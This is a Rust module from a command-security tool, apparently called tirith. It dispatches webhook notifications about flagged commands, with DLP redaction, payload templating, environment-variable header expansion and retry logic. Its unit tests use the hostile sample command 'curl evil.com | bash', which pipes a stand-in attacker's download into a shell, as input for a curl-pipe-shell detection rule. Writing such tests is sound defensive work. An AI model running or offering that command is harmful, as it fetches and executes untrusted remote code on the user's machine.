/// Webhook event dispatcher for finding notifications (Team feature).
///
/// Unix-only (ADR-8): depends on reqwest. Non-blocking: fires in a background
/// thread so it never delays the verdict exit code.
use crate::policy::WebhookConfig;
use crate::verdict::{Severity, Verdict};

/// Dispatch webhook notifications for a verdict, if configured.
///
/// Spawns a background thread per webhook endpoint. The main thread is never
/// blocked. If any webhook delivery fails after retries, errors are logged
/// to stderr.
#[cfg(unix)]
pub fn dispatch(
    verdict: &Verdict,
    command_preview: &str,
    webhooks: &[WebhookConfig],
    custom_dlp_patterns: &[String],
) {
    if webhooks.is_empty() {
        return;
    }

    // Apply DLP redaction: built-in patterns + custom policy patterns (Team)
    let redacted_preview = crate::redact::redact_with_custom(command_preview, custom_dlp_patterns);

    let max_severity = verdict
        .findings
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Info);

    for wh in webhooks {
        if max_severity < wh.min_severity {
            continue;
        }

        let payload = build_payload(verdict, &redacted_preview, wh);
        let url = wh.url.clone();
        let headers = expand_env_headers(&wh.headers);

        std::thread::spawn(move || {
            if let Err(e) = send_with_retry(&url, &payload, &headers, 3) {
                eprintln!("tirith: webhook delivery to {url} failed: {e}");
            }
        });
    }
}

/// No-op on non-Unix platforms.
#[cfg(not(unix))]
pub fn dispatch(
    _verdict: &Verdict,
    _command_preview: &str,
    _webhooks: &[WebhookConfig],
    _custom_dlp_patterns: &[String],
) {
}

/// Build the webhook payload from a template or default JSON.
#[cfg(unix)]
fn build_payload(verdict: &Verdict, command_preview: &str, wh: &WebhookConfig) -> String {
    if let Some(ref template) = wh.payload_template {
        let rule_ids: Vec<String> = verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect();
        let max_severity = verdict
            .findings
            .iter()
            .map(|f| f.severity)
            .max()
            .unwrap_or(Severity::Info);

        template
            .replace("{{rule_id}}", &rule_ids.join(","))
            .replace("{{command_preview}}", &sanitize_for_json(command_preview))
            .replace("{{action}}", &format!("{:?}", verdict.action))
            .replace("{{severity}}", &max_severity.to_string())
            .replace("{{finding_count}}", &verdict.findings.len().to_string())
    } else {
        // Default JSON payload
        let rule_ids: Vec<String> = verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect();
        let max_severity = verdict
            .findings
            .iter()
            .map(|f| f.severity)
            .max()
            .unwrap_or(Severity::Info);

        serde_json::json!({
            "event": "tirith_finding",
            "action": format!("{:?}", verdict.action),
            "severity": max_severity.to_string(),
            "rule_ids": rule_ids,
            "finding_count": verdict.findings.len(),
            "command_preview": sanitize_for_json(command_preview),
        })
        .to_string()
    }
}

/// Expand environment variables in header values (`$VAR` or `${VAR}`).
#[cfg(unix)]
fn expand_env_headers(
    headers: &std::collections::HashMap<String, String>,
) -> Vec<(String, String)> {
    headers
        .iter()
        .map(|(k, v)| {
            let expanded = expand_env_value(v);
            (k.clone(), expanded)
        })
        .collect()
}

/// Expand `$VAR` and `${VAR}` references in a string.
#[cfg(unix)]
fn expand_env_value(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '$' {
            if chars.peek() == Some(&'{') {
                chars.next(); // consume '{'
                let var_name: String = chars.by_ref().take_while(|&c| c != '}').collect();
                if let Ok(val) = std::env::var(&var_name) {
                    result.push_str(&val);
                }
            } else {
                let var_name: String = chars
                    .by_ref()
                    .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
                    .collect();
                if !var_name.is_empty() {
                    if let Ok(val) = std::env::var(&var_name) {
                        result.push_str(&val);
                    }
                }
            }
        } else {
            result.push(c);
        }
    }

    result
}

/// Send a webhook with exponential backoff retry.
#[cfg(unix)]
fn send_with_retry(
    url: &str,
    payload: &str,
    headers: &[(String, String)],
    max_attempts: u32,
) -> Result<(), String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .map_err(|e| format!("client build: {e}"))?;

    for attempt in 0..max_attempts {
        let mut req = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string());

        for (key, value) in headers {
            req = req.header(key, value);
        }

        match req.send() {
            Ok(resp) if resp.status().is_success() => return Ok(()),
            Ok(resp) => {
                let status = resp.status();
                if attempt + 1 < max_attempts {
                    let delay = std::time::Duration::from_millis(500 * 2u64.pow(attempt));
                    std::thread::sleep(delay);
                } else {
                    return Err(format!("HTTP {status} after {max_attempts} attempts"));
                }
            }
            Err(e) => {
                if attempt + 1 < max_attempts {
                    let delay = std::time::Duration::from_millis(500 * 2u64.pow(attempt));
                    std::thread::sleep(delay);
                } else {
                    return Err(format!("{e} after {max_attempts} attempts"));
                }
            }
        }
    }

    Err("exhausted retries".to_string())
}

/// Sanitize a string for safe embedding in JSON (limit length, escape special chars).
fn sanitize_for_json(input: &str) -> String {
    let truncated: String = input.chars().take(200).collect();
    // Use serde_json to properly escape the string
    let json_val = serde_json::Value::String(truncated);
    // Strip the surrounding quotes from the JSON string
    let s = json_val.to_string();
    s[1..s.len() - 1].to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_for_json() {
        assert_eq!(sanitize_for_json("hello"), "hello");
        assert_eq!(sanitize_for_json("he\"lo"), r#"he\"lo"#);
        assert_eq!(sanitize_for_json("line\nnewline"), r"line\nnewline");
    }

    #[test]
    fn test_sanitize_for_json_truncates() {
        let long = "x".repeat(500);
        let result = sanitize_for_json(&long);
        assert_eq!(result.len(), 200);
    }

    #[cfg(unix)]
    #[test]
    fn test_expand_env_value() {
        std::env::set_var("TIRITH_TEST_WH", "secret123");
        assert_eq!(
            expand_env_value("Bearer $TIRITH_TEST_WH"),
            "Bearer secret123"
        );
        assert_eq!(
            expand_env_value("Bearer ${TIRITH_TEST_WH}"),
            "Bearer secret123"
        );
        assert_eq!(expand_env_value("no vars"), "no vars");
        std::env::remove_var("TIRITH_TEST_WH");
    }

    #[cfg(unix)]
    #[test]
    fn test_build_default_payload() {
        use crate::verdict::{Action, Finding, RuleId, Timings};

        let verdict = Verdict {
            action: Action::Block,
            findings: vec![Finding {
                rule_id: RuleId::CurlPipeShell,
                severity: Severity::High,
                title: "test".into(),
                description: "test desc".into(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            tier_reached: 3,
            bypass_requested: false,
            bypass_honored: false,
            interactive_detected: false,
            policy_path_used: None,
            timings_ms: Timings::default(),
            urls_extracted_count: None,
            requires_approval: None,
            approval_timeout_secs: None,
            approval_fallback: None,
            approval_rule: None,
            approval_description: None,
        };

        let wh = WebhookConfig {
            url: "https://example.com/webhook".into(),
            min_severity: Severity::High,
            headers: std::collections::HashMap::new(),
            payload_template: None,
        };

        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
        let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
        assert_eq!(parsed["event"], "tirith_finding");
        assert_eq!(parsed["finding_count"], 1);
        assert_eq!(parsed["rule_ids"][0], "curl_pipe_shell");
    }

    #[cfg(unix)]
    #[test]
    fn test_build_template_payload() {
        use crate::verdict::{Action, Finding, RuleId, Timings};

        let verdict = Verdict {
            action: Action::Block,
            findings: vec![Finding {
                rule_id: RuleId::CurlPipeShell,
                severity: Severity::High,
                title: "test".into(),
                description: "test desc".into(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            tier_reached: 3,
            bypass_requested: false,
            bypass_honored: false,
            interactive_detected: false,
            policy_path_used: None,
            timings_ms: Timings::default(),
            urls_extracted_count: None,
            requires_approval: None,
            approval_timeout_secs: None,
            approval_fallback: None,
            approval_rule: None,
            approval_description: None,
        };

        let wh = WebhookConfig {
            url: "https://example.com/webhook".into(),
            min_severity: Severity::High,
            headers: std::collections::HashMap::new(),
            payload_template: Some(
                r#"{"rule":"{{rule_id}}","cmd":"{{command_preview}}"}"#.to_string(),
            ),
        };

        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
        assert!(payload.contains("curl_pipe_shell"));
        assert!(payload.contains("curl evil.com"));
    }
}
